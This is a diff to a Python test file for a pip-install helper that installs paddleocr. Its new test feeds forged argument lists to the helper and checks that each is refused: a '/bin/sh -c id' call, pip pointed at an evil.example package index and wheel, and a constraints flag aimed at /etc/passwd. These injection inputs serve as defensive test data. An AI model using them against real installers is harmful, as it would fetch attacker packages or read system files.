@@ -27,7 +27,7 @@ class Fake:
     def __init__(self, monkeypatch, versions, rcs=(0,), derive=None):
         self.runs, self.versions, self.rcs = [], list(versions), list(rcs)
         self.derive = derive or {"ok": True, "temp_files": [],
-                                 "argv": ["python", "-m", "pip", "install", "paddleocr"]}
+                                 "argv": [sys.executable, "-m", "pip", "install", "paddleocr"]}
         monkeypatch.setattr(pi, "child_json", self.child_json)
         monkeypatch.setattr(pi, "run_capture", self.run_capture)
         monkeypatch.setattr(pi, "snapshot", self.snapshot)
@@ -95,7 +95,7 @@ def test_apply_success_writes_result_and_clears_pending_and_lock(data, monkeypat
     fake = Fake(monkeypatch, [{"numpy": "2.5.3"}])
     out = pi.apply()
     assert out["ran"] and out["status"] == "ok"
-    assert fake.runs == [["python", "-m", "pip", "install", "paddleocr"]]
+    assert fake.runs == [[sys.executable, "-m", "pip", "install", "paddleocr"]]
     result = pi.read_result()
     assert result["status"] == "ok" and "paddleocr" in result["message"]
     assert result["tail"] == ["clean:line one", "clean:line two"]       # redacted by the child
@@ -348,6 +348,58 @@ def test_the_watchdog_stop_is_never_cleared_and_skips_the_restore(data, monkeypa
         pi._CURRENT["stop"] = False
     assert out["ran"] and len(fake.runs) == 1          # no restore pip
     assert pi.read_result()["status"] == "failed"
+
+
+def test_a_forged_argv_is_refused_and_pip_never_runs(data, monkeypatch):
+    import tempfile
+    good = [sys.executable, "-m", "pip", "install", *pi._PIP_FLAGS, "paddleocr"]
+    forged = [
+        ["/bin/sh", "-c", "id"],
+        [sys.executable, "-c", "print(1)"],
+        good + ["--index-url", "http://evil.example/simple"],
+        good + ["http://evil.example/x.whl"],
+        good + ["-c", "/etc/passwd"],
+        good + ["-c"],
+        good + [7],
+        "pip install paddleocr",
+    ]
+    for argv in forged:
+        pi.write_pending(["paddleocr"])
+        fake = Fake(monkeypatch, [], derive={"ok": True, "temp_files": [], "argv": argv})
+        out = pi.apply()
+        assert out["ran"] and fake.runs == [], argv
+        assert pi.read_result()["status"] == "refused"
+        assert "not accepted" in pi.read_result()["message"]
+    pins = os.path.join(tempfile.gettempdir(), "baihe-torch-pins-x.txt")
+    pi.write_pending(["paddleocr"])
+    fake = Fake(monkeypatch, [{"numpy": "1"}], derive={"ok": True, "temp_files": [],
+                                                       "argv": good + ["-c", pins]})
+    pi.apply()
+    assert len(fake.runs) == 1
+
+
+def test_pip_flags_match_the_ones_the_registry_emits():
+    import diagnostics
+    assert pi._PIP_FLAGS == tuple(diagnostics.PIP_INSTALL_FLAGS)
+
+
+def test_a_silent_pip_still_keeps_the_lock_fresh(data, monkeypatch):
+    lock = data / "pending_install" / "apply.lock"
+    os.makedirs(lock.parent)
+    lock.write_text("{}")
+    old = time.time() - pi.OVERALL_SECONDS - 600
+    os.utime(lock, (old, old))
+    pi._write_json("result", {"status": "running", "packages": ["x"]})
+    assert pi.status()["result"]["status"] == "interrupted"
+    clock = iter([0.0, 31.0, 32.0])
+    monkeypatch.setattr(pi.time, "monotonic", lambda: next(clock))
+    def silent_pip(argv, timeout, cancel):
+        cancel()
+        yield {"returncode": 0, "timed_out": False}
+    monkeypatch.setattr(pi, "stream_tree", silent_pip)
+    pi.run_capture(["x"], 5)
+    assert pi.apply_running() is True
+    assert pi.status()["result"]["status"] == "running"
 
 
 def test_run_capture_does_not_reset_stop(monkeypatch):
